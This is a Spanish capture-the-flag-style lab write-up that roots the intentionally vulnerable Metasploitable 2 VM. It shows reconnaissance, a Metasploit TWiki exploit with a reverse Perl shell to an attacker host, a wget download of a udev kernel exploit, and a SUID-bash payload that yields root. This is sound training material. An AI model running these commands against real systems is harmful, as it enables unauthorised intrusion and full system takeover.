# Metasploitable 2

## # Máquina: Metasploitable 2

**IP:** 192.168.56.101
**OS:** Linux (Ubuntu 8.04)
**Dificultad:** Easy (Máquina de práctica)
**Servicios Clave:** HTTP / TWiki / udev
**Fecha:** 2026-04-18
**Skills:** #WebExploitation #RCE #PrivilegeEscalation #SQLi #KernelExploit #TWiki #udev

---

## 1. Reconocimiento

Escaneo de puertos para identificar servicios expuestos:

```shell
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 192.168.56.101
```

El escaneo reveló múltiples puertos abiertos. Nos centramos en el **puerto 80 (HTTP)**.

A continuación lanzamos **Gobuster** para enumerar rutas del servidor web:

```shell
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt
```

Resultado relevante:

| Ruta | Estado | Notas |
|------|--------|-------|
| /phpinfo | 200 | Versión PHP y rutas internas |
| /tikiwiki | 301 | TikiWiki 1.9.5 |
| /twiki | 301 | TWiki versión ~2003 |
| /cgi-bin/ | 403 | Acceso denegado |
| /server-status | 403 | Acceso denegado |

---

## 2. Enumeración Web

### 2.1 TikiWiki

Visitamos `/tikiwiki` e identificamos la versión **1.9.5 -Sirius-** en el pie de página.

Buscamos exploits con `searchsploit`:

```shell
searchsploit tikiwiki
```

Encontramos el exploit `2701.txt` que describe una **inyección SQL por error** en el parámetro `sort_mode`. Al visitar la siguiente URL confirmamos que la inyección existe:

```
http://192.168.56.101/tikiwiki/tiki-listpages.php?offset=0&sort_mode=AAAA
```

**Error devuelto por MySQL:**
```
Unknown column '' in 'order clause'
```

Esto confirmó que el parámetro `sort_mode` se insertaba directamente en la cláusula `ORDER BY` sin sanitizar. Sin embargo, TikiWiki aplicaba validación en el formato del parámetro, aceptando únicamente valores con el formato `columna_asc` o `columna_desc`. Los intentos de inyección con `EXTRACTVALUE` fueron bloqueados con el mensaje `Invalid variable value`.

Tras intentar varias rutas del exploit y comprobar que la mayoría de features estaban desactivadas, **descartamos TikiWiki** como vector de entrada y pasamos a TWiki.

### 2.2 TWiki

Visitamos `/twiki` e identificamos que la instalación era de la época **1999-2003**, una versión muy antigua.

Buscamos exploits:

```shell
searchsploit twiki
```

Encontramos varios exploits relevantes:

| Exploit | Descripción |
|---------|-------------|
| 16894.rb | TWiki Search Function - Arbitrary Command Execution (Metasploit) |
| 16892.rb | TWiki History TWikiUsers - 'rev' Command Execution (Metasploit) |
| 642.pl | TWiki 20030201 - 'search.pm' Remote Command Execution |

---

## 3. Explotación — RCE en TWiki

### 3.1 Primer intento: twiki_search (16894.rb)

Lanzamos el módulo de Metasploit `twiki_search`:

```shell
msfconsole
use exploit/unix/webapp/twiki_search
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
set LPORT 8888
set URI /twiki/bin
set PAYLOAD cmd/unix/reverse_perl
```

El exploit enviaba el payload correctamente pero TWiki lo mostraba como texto en lugar de ejecutarlo, ya que apuntábamos al endpoint `/search/Main` en lugar de `/view/Main/WebSearch`.

### 3.2 Segundo intento: twiki_history (16892.rb)

Cambiamos al módulo `twiki_history` que explota el parámetro `rev`:

```shell
use exploit/unix/webapp/twiki_history
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
set LPORT 8888
set URI /twiki/bin
set PAYLOAD cmd/unix/reverse_perl
set DisablePayloadHandler false
jobs -K
run
```

**Resultado:**

```
[*] Started reverse TCP handler on 192.168.56.102:8888
[+] Successfully sent exploit request
[*] Command shell session 1 opened (192.168.56.102:8888 -> 192.168.56.101:59355)
```

Obtuvimos shell como `www-data`.

> **Nota importante:** El exploit fallaba con errores `Handler failed to bind` cuando había sesiones anteriores ocupando el puerto. Solución: usar `jobs -K` dentro de msfconsole para limpiar handlers activos antes de relanzar.

---

## 4. Post-Explotación — Escalada de Privilegios

### 4.1 Reconocimiento interno

```shell
whoami         # www-data
uname -a       # Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008
cat /etc/passwd
find / -perm -4000 -type f 2>/dev/null
```

Los binarios SUID encontrados eran estándar (umount, su, mount, ping) y no explotables directamente.

### 4.2 Identificación del vector: udev CVE-2009-1185

El kernel **2.6.24** es vulnerable al exploit **udev < 1.4.1** que permite escalada de privilegios local mediante mensajes NETLINK no verificados.

```shell
searchsploit udev 2.6
# Linux Kernel 2.6 (Ubuntu 8.10/9.04) UDEV < 1.4.1 - Local Privilege Escalation | linux/local/8572.c
```

### 4.3 Preparación del exploit

**En Kali** — copiamos el exploit y levantamos servidor HTTP:

```shell
cp /usr/share/exploitdb/exploits/linux/local/8572.c /tmp/udev.c
cd /tmp
python3 -m http.server 8080
```

**En la víctima** — encontramos el PID de udevd:

```shell
cat /proc/net/netlink
ps aux | grep udev
# udevd PID = 2579 → netlink socket = 2578
```

**En la víctima** — creamos el payload, descargamos y compilamos el exploit:

```shell
echo '#!/bin/bash' > /tmp/run
echo 'chmod +s /bin/bash' >> /tmp/run
chmod +x /tmp/run
wget http://192.168.56.102:8080/udev.c
gcc udev.c -o udev
```

### 4.4 Ejecución

El exploit recibe como argumento el PID del socket NETLINK de udevd (PID del proceso menos 1):

```shell
./udev 2578
```

Verificamos que `/bin/bash` tiene ahora el bit SUID activado:

```shell
ls -la /bin/bash
# -rwsr-sr-x 1 root root 701808 Apr 14  2008 /bin/bash
```

### 4.5 Root

```shell
bash -p
whoami   # root
id       # uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)
```

---

## 5. Resumen del ataque

```
Gobuster → /twiki identificado
        ↓
TWiki versión ~2003 → searchsploit
        ↓
Metasploit twiki_history → RCE → shell www-data
        ↓
Kernel 2.6.24 → udev CVE-2009-1185
        ↓
./udev 2578 → chmod +s /bin/bash
        ↓
bash -p → ROOT ✅
```

---

## 6. Lecciones aprendidas

- Cuando SQLMap no detecta inyección con parámetros vacíos, hay que proporcionar un valor base válido.
- Las inyecciones en cláusulas `ORDER BY` son más difíciles de explotar que las de `WHERE` y requieren técnicas específicas (error-based con EXTRACTVALUE).
- Los errores `Handler failed to bind` en Metasploit se resuelven con `jobs -K` para limpiar sesiones anteriores.
- Compilar exploits de kernel antiguos en sistemas modernos puede fallar por headers deprecados. Lo más fiable es compilar directamente en la máquina víctima.
- El PID que recibe el exploit udev es el del **socket NETLINK** (visible en `/proc/net/netlink`), que generalmente es el PID del proceso `udevd` menos 1.
